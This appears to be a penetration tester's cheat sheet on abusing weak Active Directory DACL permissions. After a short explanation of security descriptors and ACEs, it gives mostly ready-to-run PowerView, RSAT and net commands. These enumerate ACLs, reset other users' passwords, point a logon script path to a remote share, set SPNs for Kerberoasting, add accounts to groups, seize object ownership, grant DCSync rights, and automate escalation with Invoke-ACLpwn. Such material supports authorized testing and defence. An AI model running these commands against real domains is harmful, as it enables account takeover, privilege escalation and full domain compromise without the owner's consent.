# Active Directory - Exploiting DACL

### Overview

Every Active Directory security principal object, uniquely identified by a
`SID` across a domain, has a security descriptor, which dictates the trustees
that are granted permissions over the object.

The security descriptor is formatted according to the `Security Descriptor
Definition Language (SDDL)` and will usually be divided into two parts:
  - Prefix of S: `SACL` and controls auditing
  - Prefix of D: `DACL` and controls permissions

The `SDDL` uses `Access Control Entry (ACE)` strings in the `DACL` and `SACL`
components of a security descriptor string. Each `ACE` in a security descriptor
string is enclosed in parentheses in which an user account and their associated
permissions are represented.

### Enumerate DACL

###### Unitary enumeration

`DSACLS.exe` or `Get-ACL` from the `Remote Server Administration Tools (RSAT)`
and `PowerView`'s `Get-ObjectAcl` can be used to enumerate the DACL of an
Active Directory object:

```
dsacls.exe <DistinguishedName>

Get-ACL -path "AD:<DistinguishedName>" | Select -ExpandProperty Access

Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID>
Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID> -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PS_CREDENTIALS>

# List ACE of the specified user on the specified object
$UserSID = Get-DomainUser -Identity <SamAccountName | DistinguishedName | SID | GUID> | Select-Object -ExpandProperty objectsid
Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID> -ResolveGUIDs | ? {$_.securityidentifier -eq $UserSID}
```

###### Domain-wide automated enumeration

The `BloodHound` ingestor `SharpHound` (`ACL` or `All` collection methods) can
be used to automatically enumerate security objects `DACL` in order to find
exploitable paths.
Refer to the `Active Directory - BloodHound` note for more information.

### Users and groups exploitable ACEs

###### Summary

The following `ACE` can be exploited with `PowerView`:

| Object type | ACE | Description |
|-------------|-----|-------------|
| User | `GenericAll` | Full rights on the security object (including `WriteOwner` and `WriteDacl`), can be used to change the user password. |
| User | `GenericWrite` | Ability to update any non-protected object (almost) all properties values. Similar to `WriteProperty` to `all properties`. |
| User | `ForceChangePassword` | Ability to change the user password. |
| User | `AllExtendedRights` | Ability to perform any action associated with extended Active Directory rights against the object, can be used to change the user password. |
| User | `WriteOwner` | Ability to change the owner of the user, thus granting complete control over the user and notably the ability to change the user's password. |
| User | `WriteDacl` | Ability to change the DACL of the user, thus granting complete control over the user and notably the ability to add ACE to change the user's password. |
| User | `WriteProperty` to `all properties` | Ability to update any non-protected user properties values and notably update the `Script-Path` or `servicePrincipalName` properties. |
| User | `WriteProperty` to `Script-Path` | Ability to update any non-protected user logon script path which will be executed on the system upon user logon. |
| User | `WriteProperty` to `servicePrincipalName` | Ability to define or update any non-protected user servicePrincipalName, which exposes the account to Kerberoasting. |
| Group | `GenericAll` | Full rights on the security object (including `WriteOwner` and `WriteDacl`), can be used to add an user to the group. |
| Group | `GenericWrite` | Ability to update any non-protected object (almost) all properties values. Similar to `WriteProperty` to `all properties`. |
| Group | `AddMembers` | Ability to add other security objects to the group. |
| Group | `AllExtendedRights` | Ability to perform any action associated with extended Active Directory rights against the object, can be used to add others security objects to the group. |
| Group | `Self (Self-Membership)` | Ability to update any non-protected group members by adding/removing one's own account to the group. |
| Group | `WriteOwner` | Ability to change the owner of the group, thus granting complete control over the group and notably the ability to add others security objects to the group. |
| Group | `WriteDacl` | Ability to change the DACL of the group, thus granting complete control over the group and notably the ability to add others security objects to the group. |
| Group | `WriteProperty` to `all properties` | Ability to update any non-protected group properties values and notably the member property, thus allowing to add others security objects to the group. |
| Group | `WriteProperty` to the `member` or `Self-Membership` properties | Ability to update any non-protected group members, thus allowing to add others security objects to the group. |

###### User - GenericAll / ForceChangePassword / AllExtendedRights / WriteProperty to all properties

`net user`, `RSAT`'s `Set-ADAccountPassword`, and `PowerView`'s
`Set-DomainUserPassword` can be used to change the vulnerable user's password:

```
net user <USERNAME> NewPassword123! /domain

Set-ADAccountPassword -Identity <SamAccountName | DistinguishedName | SID | GUID> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<PASSWORD>" -Force)
Set-ADAccountPassword -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<PASSWORD>" -Force)

$UserPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <SamAccountName | DistinguishedName | SID | GUID> -AccountPassword $UserPassword
Set-DomainUserPassword -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -AccountPassword $UserPassword
```

###### User - WriteProperty to Script-Path

The `RSAT`'s `Set-ADObject` and `PowerView`'s `Set-DomainObject` can be used to
modify the properties of a security object.

```
Set-ADObject -Identity <SamAccountName | DistinguishedName | SID | GUID> [-Add / -Replace] @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
Set-ADObject -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> [-Add / -Replace] @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}

Set-DomainObject -Identity <SamAccountName | DistinguishedName | SID | GUID> -Set @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
Set-DomainObject -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -Set @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
```

###### User - WriteProperty to servicePrincipalName

`RSAT`'s `Set-ADUser` can be used to define or update the specified user
servicePrincipalName.

```
# SPN example: SQLservice\accounting.corp.contoso.com:1456
Set-ADUser -Identity <SamAccountName | DistinguishedName | SID | GUID> -ServicePrincipalNames @{Add="<SPN>"}"}
```

###### Group - GenericAll / GenericWrite / AddMembers / AllExtendedRights / WriteProperty to all properties / WriteProperty to the member or Self-Membership properties / Self (Self-Membership)

Generic Write access grants the ability to write to any non-protected attribute
on the target object, including "members" for a group.

`net group`, `RSAT`'s `Add-ADGroupMember`, and `PowerView`'s
`Add-DomainGroupMember` can be used to add others security objects to the
specified group.

```
net group "<GROUP>" <USERNAME> /add /domain

Add-ADGroupMember -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
Add-ADGroupMember -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity "<GROUP>" -Members <USERNAME>

Add-DomainGroupMember -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
Add-DomainGroupMember -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
```

###### User / group / GPO - WriteOwner

`PowerView`'s `Set-DomainObjectOwner` can be used to change the owner of a
security object. Being the owner of an user can be leveraged to change the
user password and being the owner of a group can allows for the addition of
others security objects to the group.

```
Set-DomainObjectOwner -Verbose -Identity <SamAccountName | DistinguishedName | SID | GUID> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID>
Set-DomainObjectOwner -Verbose -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID> -Verbose

# Once the user / group owner is changed, the GenericAll privilege can be granted to users using the new owner identity
# Refer to the "User - GenericAll" and "Group - GenericAll" parts for further exploitation
Add-DomainObjectAcl -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights All
```

###### User / group - WriteDacl

`PowerView`'s `Add-DomainObjectAcl` can be used to modify the specified object
ACE by adding the following rights: `All`, `ResetPassword`, `WriteMembers`,
`DCSync` (default to `All`) to the specified security object.

```
# TargetIdentity: security object that will be modified
# PrincipalIdentity: security object that will be given the right over the targeted object

Add-DomainObjectAcl -Verbose -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights <All | ResetPassword | WriteMembers | DCSync>
Add-DomainObjectAcl -Verbose -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights <All | ResetPassword | WriteMembers | DCSync>
```

### Automated exploitation

The PowerShell cmdlet `Invoke-ACLpwn`, leveraging `SharpHound.exe` and thus
`.NET 3.5`, can be used to exhaustively enumerate the domain security principal
objects `DACLs` and find potential paths leading to privileges escalation.

Note that `Invoke-ACLpwn` will actively add the specified user to security
groups it has control over.

```
Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe

Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -Domain '<DOMAIN>' -Username '<USERNAME>' -Password '<PASSWORD>'
```
